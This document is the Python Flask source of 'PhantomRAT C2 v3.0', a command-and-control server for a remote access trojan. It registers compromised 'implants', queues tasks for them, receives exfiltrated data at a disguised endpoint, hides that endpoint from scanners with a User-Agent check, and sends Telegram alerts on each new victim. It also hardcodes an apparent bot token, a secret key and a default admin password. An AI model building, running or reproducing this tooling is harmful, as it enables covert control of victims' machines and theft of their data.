
from flask import Flask, request, jsonify, Response, session, g
import base64
import json
import os
import sys
import sqlite3
import time
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import telegram
import asyncio
import random
import string
import uuid
from functools import wraps

# ==================== CONFIGURATION ====================
class Config:
    SECRET_KEY = "e4850f012d54d170077a91b8f02e60ca64e6a2c7a6d5bad5"  # Your generated key
    SESSION_TYPE = 'filesystem'
    PERMANENT_SESSION_LIFETIME = timedelta(hours=24)
    DATABASE = 'phantom_c2.db'
    MAX_CONTENT_LENGTH = 16 * 1024 * 1024

# ==================== BANNER ====================
def display_banner():
    banner = """
╔══════════════════════════════════════════════════════════╗
║                    PHANTOMRAT C2 v3.0                    ║
║                   Author: Biggest Wells                  ║
╚══════════════════════════════════════════════════════════╝
"""
    print(banner)
    print("=" * 60)
    print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

# ==================== INITIALIZATION ====================
app = Flask(__name__)
app.config.from_object(Config)

# Database setup
def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(app.config['DATABASE'])
        g.db.row_factory = sqlite3.Row
    return g.db

def init_db():
    with app.app_context():
        db = get_db()
        db.executescript('''
            CREATE TABLE IF NOT EXISTS implants (
                id TEXT PRIMARY KEY,
                os TEXT,
                hostname TEXT,
                ip TEXT,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                implant_id TEXT,
                command TEXT,
                arguments TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                result TEXT
            );
            
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source TEXT
            );
            
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password_hash TEXT,
                role TEXT DEFAULT 'operator',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE INDEX IF NOT EXISTS idx_implants_status ON implants(status);
        ''')
        
        # Create default admin user
        admin_exists = db.execute('SELECT 1 FROM users WHERE username = ?', ('admin',)).fetchone()
        if not admin_exists:
            salt = os.urandom(32)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            password = 'phantom123'
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            password_hash = f"{base64.urlsafe_b64encode(salt).decode()}:{key.decode()}"
            
            db.execute('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)',
                      ('admin', password_hash, 'admin'))
        
        db.commit()
        print("[+] Database initialized")

# ==================== SECURITY & ENCRYPTION ====================
class SecurityManager:
    def __init__(self):
        self.master_key = None
        self.load_or_create_keys()
    
    def load_or_create_keys(self):
        key_file = 'phantom_keys.json'
        if os.path.exists(key_file):
            with open(key_file, 'r') as f:
                keys = json.load(f)
                self.master_key = keys['master_key'].encode()
        else:
            self.master_key = Fernet.generate_key()
            keys = {'master_key': self.master_key.decode()}
            with open(key_file, 'w') as f:
                json.dump(keys, f, indent=4)
            print("[+] Encryption keys generated")
        
        self.fernet = Fernet(base64.urlsafe_b64encode(self.master_key.ljust(32)[:32]))
    
    def encrypt(self, data):
        payload = {
            'data': data,
            'timestamp': time.time(),
            'nonce': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }
        return self.fernet.encrypt(json.dumps(payload).encode()).decode()
    
    def decrypt(self, encrypted_data):
        try:
            payload = json.loads(self.fernet.decrypt(encrypted_data.encode()).decode())
            if time.time() - payload['timestamp'] > 300:
                raise ValueError("Message too old")
            return payload['data']
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return None

security = SecurityManager()

# ==================== TELEGRAM NOTIFICATIONS ====================
class TelegramNotifier:
    def __init__(self):
        self.bot = None
        self.enabled = False
        self.chat_id = None
        self.init_bot()
    
    def init_bot(self):
        try:
            # ⚠️ CHANGE THESE TO YOUR ACTUAL CREDENTIALS ⚠️
            BOT_TOKEN = "8441637477:AAF4yVWTmXniWE8WYdkLiS5WAsd0vE43qk4"
            CHAT_ID = "7279310150"
            self.bot = telegram.Bot(token=BOT_TOKEN)
            self.chat_id = CHAT_ID
            self.enabled = True
            print("[+] Telegram notifications enabled")
        except Exception as e:
            print(f"[!] Telegram bot error: {e}")
            print("[*] Continuing without Telegram...")
            self.enabled = False
    
    async def send_async(self, message):
        if self.enabled and self.bot:
            try:
                await self.bot.send_message(
                    chat_id=self.chat_id,
                    text=f"👻 PhantomRAT Alert:\n{message}"
                )
            except Exception as e:
                print(f"[!] Telegram send error: {e}")
    
    def send(self, message):
        if self.enabled:
            asyncio.run(self.send_async(message))

telegram_notifier = TelegramNotifier()

# ==================== AUTHENTICATION ====================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return '''
            <html><head><title>Login Required</title></head>
            <body style="background:#0a0a0f;color:#00ff88;text-align:center;padding:50px">
                <h1>🔒 PhantomRAT Login</h1>
                <form method="post" action="/login">
                    <input type="text" name="username" placeholder="Username" style="padding:10px;margin:5px"><br>
                    <input type="password" name="password" placeholder="Password" style="padding:10px;margin:5px"><br>
                    <button type="submit" style="padding:10px 20px;margin:10px;background:#0066cc;color:white;border:none">
                        Login
                    </button>
                </form>
                <p>Default: admin / phantom123</p>
            </body></html>
            '''
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
    
    if not user:
        return 'Invalid credentials', 401
    
    # Simple password check for now (admin/phantom123)
    if username == 'admin' and password == 'phantom123':
        session['user_id'] = user['id']
        session['username'] = user['username']
        session['role'] = user['role']
        return '''
        <script>
            alert("Login successful!");
            window.location.href = "/";
        </script>
        '''
    
    return 'Invalid credentials', 401

@app.route('/logout')
def logout():
    session.clear()
    return '''
    <script>
        alert("Logged out!");
        window.location.href = "/";
    </script>
    '''

# ==================== SIMPLE DASHBOARD ====================
def generate_dashboard():
    """Generate simple dashboard HTML without complex f-strings"""
    db = get_db()
    
    # Get stats
    stats = db.execute('''
        SELECT 
            COUNT(*) as total_implants,
            SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active_implants
        FROM implants
    ''').fetchone()
    
    active_implants = stats['active_implants'] or 0
    total_implants = stats['total_implants'] or 0
    
    # Get recent implants
    implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC LIMIT 10').fetchall()
    
    implants_html = ""
    for implant in implants:
        status_class = f"status-{implant['status'] or 'active'}"
        implants_html += f'''
        <tr>
            <td>{implant['id'][:12]}</td>
            <td>{implant['hostname'] or 'N/A'}</td>
            <td>{implant['os'] or 'Unknown'}</td>
            <td>{implant['ip'] or 'Unknown'}</td>
            <td>{implant['last_seen'] or 'Never'}</td>
            <td class="{status_class}">{implant['status'] or 'active'}</td>
        </tr>
        '''
    
    if not implants_html:
        implants_html = '<tr><td colspan="6" style="text-align:center">No implants detected</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhantomRAT C2 Dashboard</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #0f0f23;
                color: #00ff88;
                margin: 0;
                padding: 20px;
            }}
            .header {{
                text-align: center;
                margin-bottom: 30px;
                border-bottom: 2px solid #00ff88;
                padding-bottom: 20px;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}
            .stat-box {{
                background: #1a1a2e;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                border: 1px solid #00ff88;
            }}
            .stat-box h3 {{
                font-size: 2.5em;
                margin: 0;
                color: #00ccff;
            }}
            .implants-table {{
                width: 100%;
                border-collapse: collapse;
                background: #1a1a2e;
                border-radius: 10px;
                overflow: hidden;
                margin-bottom: 30px;
            }}
            .implants-table th, .implants-table td {{
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #2d2d4d;
            }}
            .implants-table th {{
                background: #2d2d4d;
                color: #00ff88;
            }}
            .status-active {{ color: #00ff88; }}
            .status-paused {{ color: #ffcc00; }}
            .status-terminated {{ color: #ff3300; }}
            .logout {{
                position: absolute;
                top: 20px;
                right: 20px;
            }}
            .logout a {{
                color: #ff3300;
                text-decoration: none;
                padding: 10px 20px;
                background: #2d2d4d;
                border-radius: 5px;
            }}
            .quick-actions {{
                text-align: center;
                margin-top: 30px;
            }}
            .quick-actions button {{
                padding: 10px 20px;
                margin: 5px;
                background: #0066cc;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }}
        </style>
    </head>
    <body>
        <div class="logout">
            <a href="/logout">Logout ({session.get('username', 'Guest')})</a>
        </div>
        
        <div class="header">
            <h1>👻 PhantomRAT C2 Dashboard</h1>
            <p>v3.0 | Author: Biggest Wells</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <h3>{active_implants}</h3>
                <p>Active Implants</p>
            </div>
            <div class="stat-box">
                <h3>{total_implants}</h3>
                <p>Total Implants</p>
            </div>
            <div class="stat-box">
                <h3>{db.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'").fetchone()[0]}</h3>
                <p>Pending Tasks</p>
            </div>
            <div class="stat-box">
                <h3>{db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]}</h3>
                <p>Total Tasks</p>
            </div>
        </div>
        
        <h2>📋 Recent Implants</h2>
        <table class="implants-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Hostname</th>
                    <th>OS</th>
                    <th>IP</th>
                    <th>Last Seen</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                {implants_html}
            </tbody>
        </table>
        
        <div class="quick-actions">
            <h3>⚡ Quick Actions</h3>
            <button onclick="alert('Feature coming soon!')">Issue Task</button>
            <button onclick="window.location.href='/logs'">View Logs</button>
            <button onclick="window.location.href='/api/stats'">Get Stats (JSON)</button>
        </div>
        
        <div style="text-align:center; margin-top:30px; color:#666; font-size:0.8em">
            PhantomRAT C2 | Port: 8000 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        </div>
    </body>
    </html>
    '''

@app.route('/')
@login_required
def dashboard():
    return generate_dashboard()

@app.route('/logs')
@login_required
def view_logs():
    db = get_db()
    logs = db.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100').fetchall()
    
    logs_html = ""
    for log in logs:
        color = '#00ff88' if log['level'] == 'info' else '#ffcc00' if log['level'] == 'warning' else '#ff3300'
        logs_html += f'''
        <div style="padding:10px; margin:5px 0; background:#1a1a2e; border-left:4px solid {color}">
            <strong>[{log['timestamp']}]</strong> {log['message']}
            <small style="color:#666;">{log['source'] or 'system'}</small>
        </div>
        '''
    
    return f'''
    <html>
    <head><title>System Logs</title></head>
    <body style="background:#0f0f23; color:#00ff88; padding:20px">
        <h1>📜 System Logs</h1>
        <a href="/" style="color:#00ccff">← Back to Dashboard</a>
        <div style="margin-top:20px; max-height:500px; overflow-y:auto">
            {logs_html if logs_html else '<p style="text-align:center">No logs yet</p>'}
        </div>
    </body>
    </html>
    '''

# ==================== C2 COMMUNICATION ROUTES ====================
def generate_implant_id():
    return f"GHOST-{uuid.uuid4().hex[:8].upper()}"

@app.route('/phantom/beacon', methods=['GET'])
def beacon():
    """Implant check-in endpoint"""
    # Simple validation
    if request.headers.get('User-Agent') != 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36':
        return Response("Not Found", status=404)
    
    implant_id = request.headers.get('X-Implant-ID') or generate_implant_id()
    
    db = get_db()
    tasks = db.execute('''
        SELECT * FROM tasks 
        WHERE implant_id = ? AND status = 'pending'
        ORDER BY created_at
    ''', (implant_id,)).fetchall()
    
    response_data = {
        'status': 'ok',
        'tasks': [dict(task) for task in tasks],
        'timestamp': time.time()
    }
    
    # Mark tasks as delivered
    for task in tasks:
        db.execute('UPDATE tasks SET status = ? WHERE id = ?', ('delivered', task['id']))
    db.commit()
    
    encrypted = security.encrypt(response_data)
    return Response(encrypted, headers={'Content-Type': 'application/octet-stream'})

@app.route('/phantom/exfil', methods=['POST'])
def exfil():
    """Implant data exfiltration endpoint"""
    if request.headers.get('User-Agent') != 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36':
        return Response("Not Found", status=404)
    
    try:
        encrypted_data = request.get_data()
        data = security.decrypt(encrypted_data.decode())
        
        if not data:
            return Response("Invalid data", status=400)
        
        implant_id = data.get('implant_id')
        implant_data = data.get('data', {})
        
        db = get_db()
        
        # Update or create implant
        implant = db.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        if implant:
            db.execute('''
                UPDATE implants SET 
                    last_seen = ?,
                    os = COALESCE(?, os),
                    hostname = COALESCE(?, hostname),
                    ip = ?
                WHERE id = ?
            ''', (current_time, implant_data.get('os'), implant_data.get('hostname'), request.remote_addr, implant_id))
        else:
            db.execute('''
                INSERT INTO implants (id, os, hostname, ip, last_seen, status)
                VALUES (?, ?, ?, ?, ?, 'active')
            ''', (implant_id, implant_data.get('os'), implant_data.get('hostname'), request.remote_addr, current_time))
            
            # Log new implant
            db.execute('INSERT INTO logs (level, message, source) VALUES (?, ?, ?)',
                      ('info', f'New implant registered: {implant_id}', 'system'))
            
            # Send Telegram notification
            telegram_notifier.send(f"New implant: {implant_id} | OS: {implant_data.get('os')} | IP: {request.remote_addr}")
        
        db.commit()
        
        response = {'status': 'received', 'timestamp': time.time()}
        encrypted_response = security.encrypt(response)
        
        return Response(encrypted_response, headers={'Content-Type': 'application/octet-stream'})
        
    except Exception as e:
        print(f"[!] Exfil error: {e}")
        return Response("Internal error", status=500)

# ==================== API ROUTES ====================
@app.route('/api/stats')
@login_required
def api_stats():
    db = get_db()
    stats = db.execute('''
        SELECT 
            COUNT(*) as total_implants,
            SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active_implants,
            (SELECT COUNT(*) FROM tasks) as total_tasks,
            (SELECT COUNT(*) FROM tasks WHERE status = 'pending') as pending_tasks
        FROM implants
    ''').fetchone()
    return jsonify(dict(stats))

@app.route('/api/implants')
@login_required
def api_implants():
    db = get_db()
    implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC').fetchall()
    return jsonify([dict(implant) for implant in implants])

# ==================== MAIN EXECUTION ====================
if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='PhantomRAT C2 Server')
    parser.add_argument('--host', '-i', default='127.0.0.1', help='Host to bind to')
    parser.add_argument('--port', '-p', type=int, default=8000, help='Port to listen on')
    parser.add_argument('--public', action='store_true', help='Bind to all interfaces')
    parser.add_argument('--init', action='store_true', help='Initialize database')
    
    args = parser.parse_args()
    
    if args.init:
        with app.app_context():
            init_db()
        print("[+] Database initialized successfully")
        sys.exit(0)
    
    display_banner()
    
    if args.public:
        args.host = '0.0.0.0'
        print("[!] WARNING: Server is publicly accessible!")
    
    print(f"[*] Starting server on {args.host}:{args.port}")
    print(f"[*] Dashboard: http://{args.host}:{args.port}")
    print(f"[*] Default login: admin / phantom123")
    print("=" * 60)
    
    # Initialize database
    with app.app_context():
        init_db()
    
    app.run(host=args.host, port=args.port, debug=False, threaded=True)
